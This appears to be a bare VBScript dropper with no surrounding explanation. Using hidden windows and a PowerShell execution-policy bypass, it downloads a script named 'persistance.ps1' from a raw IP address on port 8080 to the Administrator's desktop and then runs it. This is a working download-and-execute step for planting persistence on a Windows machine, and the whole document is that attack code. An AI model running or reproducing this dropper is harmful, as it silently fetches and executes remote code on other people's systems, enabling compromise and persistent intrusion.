Set wscriptShell = CreateObject("Wscript.Shell")

wscriptShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://54.209.180.198:8080/persistance.ps1' -OutFile 'C:\Users\Administrator\Desktop\persistance.ps1'""", 0, False

wscriptShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\Administrator\Desktop\persistance.ps1""", 0, False